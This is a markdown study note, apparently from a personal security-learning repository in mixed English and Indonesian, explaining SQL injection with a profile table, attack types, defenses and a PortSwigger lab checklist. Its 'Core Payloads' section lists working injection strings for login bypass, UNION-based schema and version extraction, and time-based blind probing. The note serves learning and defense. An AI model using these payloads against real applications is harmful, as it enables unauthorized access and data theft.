# 🐍 Monster: SQL Injection

> *"The database trusts the query. The query trusts the input. The input trusts no one."*

---

## 🧬 Monster Profile

| Attribute | Value |
|---|---|
| **OWASP Rank** | A03:2021 — Injection |
| **Impact** | Authentication bypass, data exfiltration, RCE (in some cases) |
| **Prevalence** | Very common — still found in production systems |
| **Tools** | sqlmap, Burp Suite, manual payload crafting |

---

## 🔬 How It Works

SQL Injection terjadi ketika **input user** dimasukkan langsung ke dalam query SQL tanpa sanitasi.

```
Input user:  admin' OR '1'='1
```

```sql
-- Query yang dimaksud developer
SELECT * FROM users WHERE username = 'input' AND password = 'input'

-- Query yang terjadi setelah injection
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'anything'
```

Karena `'1'='1'` selalu true, login bypass berhasil.

---

## 🗡️ Attack Types

### 1. In-Band SQLi
Response langsung terlihat di halaman.

- **Error-based** — error message bocorkan struktur DB
- **UNION-based** — gabungkan hasil query lain ke output

### 2. Blind SQLi
Tidak ada output langsung, tapi bisa disimpulkan dari behavior.

- **Boolean-based** — kirim kondisi true/false, lihat perbedaan response
- **Time-based** — pakai `SLEEP()` atau `WAITFOR DELAY` untuk inferensi

### 3. Out-of-Band SQLi
Data dikirim ke server eksternal (DNS, HTTP). Jarang, tapi powerful.

---

## 💉 Core Payloads

```sql
-- Basic detection
'
''
`
')
"))

-- Authentication bypass
' OR '1'='1
' OR 1=1--
admin'--
' OR 'x'='x

-- Comment syntax by database
-- MySQL / MSSQL
--
#

-- Oracle
--

-- PostgreSQL
--

-- UNION attack skeleton (find column count first)
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

-- Extract version info
' UNION SELECT @@version--          -- MySQL/MSSQL
' UNION SELECT version()--          -- PostgreSQL
' UNION SELECT banner FROM v$version-- -- Oracle

-- List tables (non-Oracle)
' UNION SELECT table_name FROM information_schema.tables--

-- Time-based blind
' AND SLEEP(5)--                    -- MySQL
' AND 1=CONVERT(int,(SELECT CHAR(65)))-- -- MSSQL
```

---

## 🛡️ How to Slay It (Defense)

1. **Prepared statements / parameterized queries** — input tidak pernah masuk ke SQL string
2. **Input validation** — whitelist, bukan blacklist
3. **Least privilege** — DB user hanya punya akses minimum
4. **WAF** — sebagai layer tambahan, bukan satu-satunya defense
5. **Error handling** — jangan ekspose error message ke user

---

## 🧪 Lab Checklist (PortSwigger)

Progress kamu di 18 labs SQLi:

| # | Lab | Level | Status |
|---|---|---|---|
| 01 | [Hidden data retrieval](../../hunts/portswigger/sqli/01-hidden-data.md) | 🟢 | ☐ |
| 02 | [Login bypass](../../hunts/portswigger/sqli/02-login-bypass.md) | 🟢 | ☐ |
| 03 | Query DB type — Oracle | 🔵 | ☐ |
| 04 | Query DB type — MySQL/MSSQL | 🔵 | ☐ |
| 05 | List DB contents — non-Oracle | 🔵 | ☐ |
| 06 | List DB contents — Oracle | 🔵 | ☐ |
| 07 | UNION — column count | 🔵 | ☐ |
| 08 | UNION — find text column | 🔵 | ☐ |
| 09 | UNION — retrieve from other tables | 🔵 | ☐ |
| 10 | UNION — multiple values in one column | 🔵 | ☐ |
| 11 | Blind — conditional responses | 🔵 | ☐ |
| 12 | Blind — conditional errors | 🔵 | ☐ |
| 13 | Visible error-based | 🔵 | ☐ |
| 14 | Blind — time delays | 🔵 | ☐ |
| 15 | Blind — time delays + info retrieval | 🔵 | ☐ |
| 16 | Blind — out-of-band interaction | 🔵 | ☐ |
| 17 | Blind — out-of-band exfiltration | 🔵 | ☐ |
| 18 | Filter bypass via XML encoding | 🔵 | ☐ |

---

## 🔗 Related Monsters

- [NoSQL Injection](../nosql/intro.md) — same concept, different query language
- [SSTI](../ssti/intro.md) — injection into template engines
- [OS Command Injection](../os-command-injection/intro.md) — injection into shell commands

---

## 📚 Further Reading

- [PortSwigger SQLi Theory](https://portswigger.net/web-security/sql-injection)
- [SQLi Cheatsheet (Codex)](../../../codex/sqli.md)
- [sqlmap Documentation](https://sqlmap.org)
